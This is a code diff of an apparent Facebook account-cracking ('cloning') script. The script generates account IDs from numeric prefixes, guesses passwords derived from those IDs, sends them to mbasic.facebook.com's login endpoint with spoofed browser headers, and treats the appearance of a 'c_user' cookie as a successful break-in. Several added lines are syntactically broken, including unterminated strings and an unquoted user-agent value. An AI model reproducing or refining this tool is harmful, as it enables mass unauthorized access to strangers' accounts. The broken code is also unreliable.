@@ -148,12 +148,12 @@ for xd in range(10000):
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0'
     h=random.randrange(73,100)
     i='0'
     j=random.randrange(4200,4900)
     k=random.randrange(40,150)
-    l='Mobile Safari/537.36'
+    l='Safari/537.36'
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
     ugen.append(uaku2)
     
@@ -170,8 +170,8 @@ def xxr():
     rk1 = '01931'
     rk2 = '01932'
     rk3 = '01937'
-    rk4 = '0199'
-    rk5 = '01961'
+    rk4 = '01921'
+    rk5 = '0192'
     rk6 = '019'
     code = random.choice([rk1,rk2,rk3,rk4,rk5,rk6])                      # input(f' [{xr}■{x}] Choose : ')
     os.system('clear')
@@ -194,9 +194,9 @@ def xxr():
         jalan('\033[1;97m•••○○○•••○○○•••○○○•••○○○•••○○○•••○○○•••○○○•••○○○•••○○○•••○○○•••')
         jalan(f'[{xr}•_•{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
         jalan(f'{x}[{xr}•_•{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
-        jalan(f'\033[0;97m[{xr}•_•{x}]\033[0;93m USE YOUR MOBILE DATA ')
-        jalan(f'\033[0;97m[{xr}•_•{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
-        jalan(f'\033[0;97m[{xr}•_•{x}] \033[0;95mSuper Fast Speed Cloning')
+        jalan(f'\033[0;94m[{xr}•_•{x}]\033[0;93m USE YOUR MOBILE DATA ')
+        jalan(f'\033[0;98m[{xr}•_•{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+        jalan(f'\033[1;95m[{xr}•_•{x}] \033[0;95mSuper Fast Speed Cloning')
         jalan('\033[1;97m•••○○○•••○○○•••○○○•••○○○•••○○○•••○○○•••○○○•••○○○•••○○○•••○○○•••')
         for love in user:
             pwx = [love[1:]]
@@ -229,20 +229,21 @@ def rcrack(uid,pwx,tl):
             "login":"Log In"}
             header_freefb = {"authority": 'mbasic.facebook.com',
             "method": 'GET',
+            "path: '/', 
             "scheme": 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
             # 'cookie': 'datr=zwaiY8oIpRJmusfwcUYR3gcl; sb=zwaiY5XKI6dYvdiAT8MfIAzF; wd=979x1831; dpr=2.34375; fr=0FGFgDcD2x3MSPEbJ..BjogbP.Fh.AAA.0.0.Bjt7jq.AWXveghp-AI',
-            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua': "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109",
             'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
+            'sec-fetch-site': 'cross-site',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': pro}
+            'user-agent': Mozilla/5.0 (Windows NT 10.0; Win64; x64}
             lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
